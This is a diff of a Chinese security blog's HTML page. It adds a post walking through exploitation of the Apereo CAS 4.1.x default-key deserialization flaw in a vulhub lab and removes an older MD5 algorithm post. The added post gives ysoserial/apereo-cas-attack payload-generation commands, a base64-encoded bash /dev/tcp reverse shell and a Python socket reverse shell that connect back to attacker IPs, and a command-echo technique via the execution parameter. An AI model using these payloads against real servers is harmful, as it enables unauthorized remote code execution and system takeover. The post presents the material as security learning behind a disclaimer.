@@ -156,6 +156,134 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CAS反序列化漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-13 11:14:17" itemprop="dateCreated datePublished" datetime="2023-08-13T11:14:17+08:00">2023-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-14 20:22:55" itemprop="dateModified" datetime="2023-08-14T20:22:55+08:00">2023-08-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="实战-CAS反序列化漏洞"><a href="#实战-CAS反序列化漏洞" class="headerlink" title="实战|CAS反序列化漏洞"></a>实战|CAS反序列化漏洞</h1><p><strong>免责声明</strong></p>
+<p><strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
+<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​    2016年被发现，漏洞成因是在4.1.7版本以前一直存在一个默认密钥问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，从而执行任意命令。</p>
+<h2 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h2><p>​    Apereo CAS 4.1.X~4.1.6</p>
+<h2 id="0x03漏洞环境或指纹"><a href="#0x03漏洞环境或指纹" class="headerlink" title="0x03漏洞环境或指纹"></a>0x03漏洞环境或指纹</h2><p><strong>指纹：</strong>execution等可以执行命令的参数</p>
+<p><strong>工具：</strong>apereo-cas-attack，Apereo-cas-attaack：使用ysoserial的CommonsCollections4生成加密后的Payload</p>
+<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><h3 id="A、利用方式1：新建目录poc"><a href="#A、利用方式1：新建目录poc" class="headerlink" title="A、利用方式1：新建目录poc"></a><strong>A、利用方式1：新建目录poc</strong></h3><p>环境：vulhub环境（这里是安装了vulhub的kali）</p>
+<ul>
+<li><strong>步骤1：使用工具生成payload</strong></li>
+</ul>
+<p>工具：apereo-cas-attack</p>
+<p><strong>Payload指令</strong>：在tmp目录下新建success文档</p>
+<p><code>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/sucess&quot;</code></p>
+<p> <img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813113103482.png" alt="image-20230813113103482"></p>
+<ul>
+<li><strong>步骤2：在CAS主页抓包</strong></li>
+</ul>
+<p>​    一般是登录界面且传递的参数可以执行命令，如execution参数。</p>
+<p><img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813113026259.png" alt="image-20230813113026259"></p>
+<p>​    将步骤1生成的payload替换execution参数的值，注意不要把execution参数值后的其他参数删了；替换值，然后放包。</p>
+<ul>
+<li><strong>步骤3：查看结果</strong></li>
+</ul>
+<p>到tmp目录下查看是否有success文档，如果有则代表利用成功（存在漏洞）。</p>
+<h3 id="B、利用方式2：反弹shell"><a href="#B、利用方式2：反弹shell" class="headerlink" title="B、利用方式2：反弹shell"></a><strong>B、利用方式2：反弹shell</strong></h3><ul>
+<li><strong>步骤1：生成shell的payload</strong></li>
+</ul>
+<p>【Shell】：bash -i &gt;&amp; /dev/tcp/<font color="red">攻击机ip/监听端口</font>1 0&gt;&amp;1</p>
+<p>然后将shell进行base64编码</p>
+<p> <img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813112103566.png" alt="image-20230813112103566"></p>
+<p><strong>利用工具生成payload：</strong></p>
+<p><strong>指令</strong>：<code>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM0LjgyLzQ0NDQgMD4mMQ==&#125; | &#123;base64,-d&#125; | &#123;bash,-i&#125;&quot;</code></p>
+<p><strong>得到payload1</strong></p>
+<p> <img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813111715310.png" alt="image-20230813111715310"></p>
+<ul>
+<li><strong>步骤2：生成反弹shell</strong></li>
+</ul>
+<p>​       python生成的payload如下，然后直接替换execution后即可反弹成功（可能需要先进行base64编码）：</p>
+<p><strong>payload：</strong><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.3&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])</code></p>
+<p>​    192.168.0.3需要改为自己对应的ip，7777是监听端口</p>
+<ul>
+<li> <strong>步骤3：回显与检查</strong></li>
+</ul>
+<p>​    <strong>目的</strong>：网站所在系统环境无法出网，可能没发正常看到结果，回显可以直接看到命令执行的返回内容。</p>
+<p>​    使用魔改工具ysoserial-mangguogan-master，Payload如下，然后将编码后的数据替换execution，并且在请求头中添加cmd：whoami等命令，查看回显。</p>
+<p><code>Payload：java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonsCollections4</code></p>
+<ul>
+<li><strong>步骤4：查看回显结果</strong></li>
+</ul>
+<p>​    替换execution并在请求投输入执行命令（如：cmd：whoami）</p>
+<p><img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230814201747991.png" alt="image-20230814201747991"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/12/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2636,119 +2764,6 @@ int main()
 <li>Wang2005_Chapter_FindingCollisionsInTheFullSHA-1</li>
 <li>Wang2005_Chapter_EfficientCollisionSearchAttack</li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/12/10/MD5%E7%AE%97%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/10/MD5%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">MD5算法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-10 10:37:59" itemprop="dateCreated datePublished" datetime="2021-12-10T10:37:59+08:00">2021-12-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-22 20:23:24" itemprop="dateModified" datetime="2022-01-22T20:23:24+08:00">2022-01-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">密码学</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h2><h4 id="一、算法描述"><a href="#一、算法描述" class="headerlink" title="一、算法描述"></a>一、算法描述</h4><p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211205170412739.png" alt="image-20211205170412739"></p>
-<p>​    参数说明：</p>
-<p>​        L：分组数</p>
-<p>​        N：消息总的字数    </p>
-<p>算法的输入为任意长，输出为128比特的消息摘要；算法过程一般分一下几个步骤：</p>
-<p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122201357978.png" alt="image-20220122201357978"></p>
-<p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122201413175.png" alt="image-20220122201413175"></p>
-<h4 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h4><p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122201528334.png" alt="image-20220122201528334"></p>
-<p>​    其流程图如下：</p>
-<img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211205215829658.png" alt="image-20211205215829658" style="zoom:80%;">
-
-<p>​            <strong>常数表T：</strong></p>
-<img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211205220040713.png" alt="image-20211205220040713" style="zoom:80%;">
-
-<p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122202319618.png" alt="image-20220122202319618"></p>
-<h4 id="三、MD5的压缩函数"><a href="#三、MD5的压缩函数" class="headerlink" title="三、MD5的压缩函数"></a>三、MD5的压缩函数</h4><p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122201549386.png" alt="image-20220122201549386"></p>
-<p>​    压缩函数中的一步<strong>迭代结构图</strong>如下：（非对称的feistel结构）</p>
-<img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211206100445631.png" alt="image-20211206100445631" style="zoom:33%;">
-
-<p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122201602013.png" alt="image-20220122201602013"></p>
-<ul>
-<li><p>第2轮：p(i) = (1+5i)mod 16</p>
-</li>
-<li><p>第3轮：p(i) = (5+3i)mod 16</p>
-</li>
-<li><p>第4轮：p(i) = 7i mod 16    </p>
-<p>运算完成后再循环右移一个字，即得到这一步迭代的输出。</p>
-</li>
-</ul>
-<p><strong>压缩函数循环左移位数s-表</strong>    </p>
-<p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211206105636198.png" alt="image-20211206105636198"></p>
-<p><strong>逻辑函数F，G，H，I的结构</strong></p>
-<p>​    输入：3个32比特的字</p>
-<p>​    输出：1个32比特的字</p>
-<p>​    运算方式：位运算，即逐个比特的逻辑运算</p>
-<p>​    运算结构如下表：</p>
-<p>​                <img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211206110633789.png" alt="image-20211206110633789"></p>
-<p><strong>附</strong>：逻辑函数的真值表</p>
-<p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20211206110933366.png" alt="image-20211206110933366"></p>
-<h4 id="四、MD5的安全性"><a href="#四、MD5的安全性" class="headerlink" title="四、MD5的安全性"></a>四、MD5的安全性</h4><p><img src="/2021/12/10/MD5%E7%AE%97%E6%B3%95/image-20220122201622971.png" alt="image-20220122201622971"></p>
 
       
     </div>
